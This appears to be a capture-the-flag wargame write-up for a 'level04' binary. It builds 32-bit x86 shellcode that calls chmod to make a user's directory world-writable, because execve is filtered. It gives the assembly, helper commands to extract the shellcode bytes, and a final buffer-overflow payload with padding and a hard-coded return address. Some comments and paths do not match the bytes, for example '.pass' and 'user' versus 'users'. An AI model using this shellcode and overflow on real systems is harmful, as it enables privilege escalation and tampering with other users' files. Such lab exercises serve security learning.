We can't use the sys_execve() [0x0b] system call because "while (local_18 != 0xb)" doesn't allow us to pass the check.

So for this solution we're going to use the sys_chmod() [0x0f] system call to change the permissions of the directory /home/user/level05 to 777

To do that that's the assembly code we're going to use:

section.text					; Define the section for the executable code
	global _start				; Declare the label '_start' as a global entry point

_start:
	xor eax, eax				; Zero out the EAX register (common technique for setting a register to 0)
	push eax					; Push 0 onto the stack (to be used as the NULL terminator for a string)
	push 0x35306c65				; el05
	push 0x76656c2f				; /lev
	push 0x73726573				; sers
	push 0x752f656d				; me/u
	push 0x6f682f2f				; //ho

	mov ebx, esp				; Move the stack pointer into EBX (EBX now points to the start of the string)
	mov al, 0x0f				; Load the syscall number for 'chmod' (15 in decimal) into AL
	mov cx, 777o				; Move the octal value 777 (rwx for all) into CX for chmod's mode argument
	int 0x80					; Trigger interrupt 0x80 to make the system call with the parameters in EAX, EBX, ECX

	mov al, 1					; Syscall number for exit is 1
	xor ebx, ebx				; Return 0 status on exit
	int 0x80


The python script that automatically converts "/home/user/level05" to the hex values that we need to push onto the stack is:
python -c "s='/home/users/level05'[::-1]; print('\n'.join(['push 0x'+''.join('{:02x}'.format(ord(c)) for c in s[i:i+4].ljust(4,'/')) for i in range(0,len(s),4)]))"

python -c "
s='/home/users/level05'[::-1];  # Reverse the string '/home/users/level05'
print(
  '\n'.join([  # Join each element of the list with a newline character and print
    'push 0x' +  # Prefix each line with 'push 0x' for assembly language push instruction
    ''.join(  # Join the following hex characters into a single string
      '{:02x}'.format(ord(c))  # Convert each character to its two-digit hex value
      for c in s[i:i+4].ljust(4,'/')  # Take a 4-character slice of the reversed string and pad with '/' if less than 4 characters
    ) 
    for i in range(0, len(s), 4)  # Iterate over the reversed string in steps of 4 characters
  ])
)"


We assemble the code with nasm and link it with ld:
nasm -f elf32 chmod.asm -o chmod.o && ld -m elf_i386 -o chmod chmod.o
objdump -d chmod | grep -Po '\s\K[\da-f]{2}(?=\s)' | tr -d '\n' | sed 's/\([0-9a-f]\{2\}\)/\\x\1/g' | sed 's/^/"/' | sed 's/$/"/'




////
WORKING

section.text
   global _start

_start:
    ; Push the mode and the string '////home/users/level05/.pass' onto the stack
    ; We push the string in reverse since the stack grows downwards
    xor eax, eax          ; Clear eax register
    push eax              ; Push a null byte to terminate the string
        push 0x2F2F3530
        push 0x6C657665
        push 0x6C2F7372
        push 0x6573752F
        push 0x656D6F68
        push 0x2F2F2F2F

    ; ebx will point to the string '/home/users/level05/.pass'
    mov ebx, esp          ; Move the pointer to the string into ebx

    ; Load the syscall number for chmod (15) into eax
    mov al, 15

    ; Load the permission mode 0777 into ecx (S_IRWXU | S_IRWXG | S_IRWXO)
    mov cx, 777o

    ; Make the syscall
    int 0x80

    ; Exit the program
    ; Syscall number for exit is 1
    mov al, 1
    xor ebx, ebx          ; Return 0 status on exit
    int 0x80

 env - PWD=$PWD ~/level04 <<< $(python -c '
shellcode="\x31\xc0\x50\x68\x30\x35\x2f\x2f\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x89\xe3\xb0\x0f\x66\xb9\xff\x01\xcd\x80\xb0\x01\x31\xdb\xcd\x80"
print(shellcode + "A" * (156 - len(shellcode)) + "\xa0\xdd\xff\xff")')
